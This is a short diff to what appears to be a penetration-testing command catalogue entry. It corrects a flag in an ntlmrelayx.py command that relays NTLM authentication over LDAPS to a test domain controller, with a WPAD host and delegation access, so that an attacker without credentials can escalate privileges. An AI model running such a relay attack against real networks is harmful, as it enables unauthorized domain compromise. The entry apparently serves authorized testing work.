@@ -9,7 +9,7 @@ description: |
   	Target Domain Controller: dc.test.local
 
 command: |
-  python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegat-access
+  python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegate-access
 items:
   - No_Creds
 services:
